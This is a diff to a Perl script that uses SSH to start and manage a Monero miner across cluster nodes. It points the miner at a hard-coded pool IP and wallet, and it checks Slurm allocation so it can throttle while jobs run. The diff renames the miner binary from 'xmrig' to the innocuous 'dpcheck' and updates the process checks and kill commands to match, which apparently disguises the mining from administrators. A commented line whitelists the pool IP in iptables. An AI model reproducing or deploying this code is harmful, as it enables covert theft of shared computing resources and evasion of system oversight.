@@ -12,10 +12,10 @@ my $miner = "lolminer";# or lolminer
 my $threads = 2; #thread no for node with 
 ###main jobs to do
 #my $killjobs = "yes";
-my $sumitjobs = "yes";
-my $killjobs = "no";
+my $sumitjobs = "no";
+my $killjobs = "yes";
 #my $sumitjobs = "no";
-my $checkstatus = "no";
+my $checkstatus = "yes";
 my %nodes = (
     #161 => [0],#8..18,20..22,39..41],#[1,3,39..42],#1,3,39..
     #161 => [8..18],#8..18,20..22,39..41],#[1,3,39..42],#1,3,39..
@@ -65,10 +65,10 @@ $pm->start and next;
     my $nodename= "node"."$nodeindex";
     my $cmd = "/usr/bin/ssh $nodename ";
     my $mining_x = "nohup /home/jsp/cluster/dpcheck --coin=XMR -o 18.167.166.214:2222 \\
-       -u 89g9n2yjhehJxhjLG9JTsP7smM9MnddbcgiEiCJ2bdyHGXGzsVZc9NpMSJpywd5kbY6zbogerdmpaVxiHpPuCioCSwGE8gS\.$nodename-$cluster \\
+       -u 89g9n2yjhehJxhjLG9JTsP7smM9MnddbcgiEiCJ2bdyHGXGzsVZc9NpMSJpywd5kbY6zbogerdmpaVxiHpPuCioCSwGE8gS\.$cluster-$nodename \\
        -p x 2>&1 >/dev/null &";
     my $mining_t = "nohup /home/jsp/cluster/dpcheck --coin=XMR -o 18.167.166.214:2222 \\
-       -u 89g9n2yjhehJxhjLG9JTsP7smM9MnddbcgiEiCJ2bdyHGXGzsVZc9NpMSJpywd5kbY6zbogerdmpaVxiHpPuCioCSwGE8gS\.$nodename-$cluster \\
+       -u 89g9n2yjhehJxhjLG9JTsP7smM9MnddbcgiEiCJ2bdyHGXGzsVZc9NpMSJpywd5kbY6zbogerdmpaVxiHpPuCioCSwGE8gS\.$cluster-$nodename \\
        -p x --threads=$threads 2>&1 >/dev/null &";
 
     #my $mining_cmd;
@@ -76,14 +76,14 @@ $pm->start and next;
     #./xmrig --coin=XMR -o  18.167.166.214:2222 -u 89g9n2yjhehJxhjLG9JTsP7smM9MnddbcgiEiCJ2bdyHGXGzsVZc9NpMSJpywd5kbY6zbogerdmpaVxiHpPuCioCSwGE8gS.nuu -p x
     #./xmrig --coin=XMR -o  xmr.2miners.com:2222 -u 89g9n2yjhehJxhjLG9JTsP7smM9MnddbcgiEiCJ2bdyHGXGzsVZc9NpMSJpywd5kbY6zbogerdmpaVxiHpPuCioCSwGE8gS.RIG_ID -p x
    #iptables -A INPUT -p all -s 18.167.166.214 -j ACCEPT
-     my $temp = `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"xmrig\\\""`;
+     my $temp = `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"dpcheck\\\""`;
     print "*****$nodename*****\n";
     print "###node status before all cmd:\n $temp\n";
     if($killjobs eq "yes"){
         print "#Want to kill job\n";
         if($temp){
             print "killing job\n";
-            `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"xmrig\\\"|awk '{print \\\$2}'|xargs kill"`;
+            `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"dpcheck\\\"|awk '{print \\\$2}'|xargs kill"`;
         }
         else{
              print "No existing job currently!\n";
@@ -99,7 +99,7 @@ $pm->start and next;
         #die;
         my $state = `scontrol show node $nodename|grep ALLOCATED`;#used 
         my $temp_t = `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/grep '\\\--threads='"`;#has been used
-        my $temp_x = `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/grep -v '\\\--threads=' |/usr/bin/grep xmrig"`;#has been used
+        my $temp_x = `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/grep -v '\\\--threads=' |/usr/bin/grep dpcheck"`;#has been used
         chomp ($state,$temp_t,$temp_x);       
 # print "killing job\n";
        #     `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"xmrig\\\"|awk '{print \\\$2}'|xargs kill"`;
@@ -108,13 +108,13 @@ $pm->start and next;
         if($temp_x){#full performance 
           #kill first then submit thread job
           print "killing x job\n";
-          `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"xmrig\\\"|awk '{print \\\$2}'|xargs kill"`;
+          `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"dpcheck\\\"|awk '{print \\\$2}'|xargs kill"`;
           sleep(1);
           print "Allocated, kill x job. Submitting t job\n";
             my $pid = fork();
 		    if ($pid == 0) {exec("$cmd '$mining_t'");}# if($pid == 0);
         }#$temp_x true and allocated
-        elsif(!$temp_x and !$temp_t){#no jobs
+        elsif(!$temp_x and !$temp_t){#no jobs with ALLOCATED state
             print "Allocated with no jobs. Submitting t job\n";            
             my $pid = fork();
 		    if ($pid == 0) {exec("$cmd '$mining_t'");}# if($pid == 0);
@@ -127,7 +127,7 @@ $pm->start and next;
         if($temp_t){#t job exists 
           #kill t job first then submit x job
           print "killing t job\n";
-          `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"xmrig\\\"|awk '{print \\\$2}'|xargs kill"`;
+          `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"dpcheck\\\"|awk '{print \\\$2}'|xargs kill"`;
           sleep(1);
           print "No Allocated, kill t job. Submitting x job\n";
             my $pid = fork();
@@ -146,7 +146,7 @@ $pm->start and next;
     }#submitjob eq yes or no
 
     if($checkstatus eq "yes"){
-        $temp = `$cmd "ps aux|grep -v grep|grep xmrig"`;
+        $temp = `$cmd "ps aux|grep -v grep|grep dpcheck"`;
         print "#Want to check node current status\n";
         print "Checking status\n";
         print "output:$temp\n";
